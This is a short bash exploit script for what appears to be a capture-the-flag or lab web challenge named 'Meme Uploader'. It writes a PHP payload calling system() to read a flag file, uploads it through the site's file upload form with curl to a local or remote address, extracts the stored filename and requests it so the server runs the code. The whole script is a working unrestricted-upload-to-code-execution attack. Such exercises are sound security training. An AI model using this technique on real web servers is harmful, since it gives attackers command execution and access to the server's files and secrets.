#!/bin/bash

PORT=8003

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.101:'$PORT
else
    URL='http://'$1':'$2
fi

# Meme Uploader
echo "Starting exploit for Meme Uploader"

echo "Creating a random filename to avoid conflicts with existing filenames on the server"
RANDOM=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13 ; echo '')
FILENAME="${RANDOM}.php"

echo "Writing the payload content to the file on disk"
echo '<?php echo system("cat ../flag.php"); ?>' > $FILENAME

echo "Uploading it on the server"
OUTPUT=$(curl -s -F "fileToUpload=@${FILENAME}" -F 'submit=Upload meme' $URL)

echo "Extracting the new filename (hashed)"
NEW_FILENAME=$(echo $OUTPUT | sed 's/.*Your file \([^ ]*\).*/\1/')

echo "Deleting locally generated file"
rm $FILENAME

echo "Accessing the file on the server"
echo "Flag is"
curl $URL'/uploads/'$NEW_FILENAME
